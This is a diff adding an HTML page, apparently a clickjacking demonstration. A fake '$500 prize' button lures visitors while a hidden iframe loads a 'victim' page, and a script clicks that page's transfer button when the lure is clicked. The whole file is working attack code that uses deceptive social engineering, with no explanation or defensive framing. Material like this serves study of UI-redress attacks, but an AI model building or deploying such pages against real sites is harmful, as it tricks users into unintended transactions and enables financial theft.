@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Prize Giveaway!</title>
+  <style>
+    body { text-align: center; padding-top: 150px; margin:0 }
+    button { font-size:1.2em; padding:10px 20px; cursor:pointer }
+    iframe {
+      position: absolute;
+      top: 0; left: 0;
+      width: 0; height: 0;     
+      border: none;
+      visibility: hidden;
+    }
+  </style>
+</head>
+<body>
+  <h1>Congratulations! You've won a prize!</h1>
+  <p>Click below to claim your $500</p>
+  <button id="fakeBtn">Claim Your $500 Prize</button>
+  <iframe id="victimFrame" src="victim_secure.html"></iframe>
+  <script>
+    const fakeBtn = document.getElementById('fakeBtn');
+    const victimFrame = document.getElementById('victimFrame');
+    victimFrame.addEventListener('load', () => {
+      fakeBtn.addEventListener('click', () => {
+        const realBtn = victimFrame.contentWindow
+                            .document
+                            .querySelector('.transfer-btn');
+        realBtn.click();
+      });
+    });
+  </script>
+</body>
+</html>
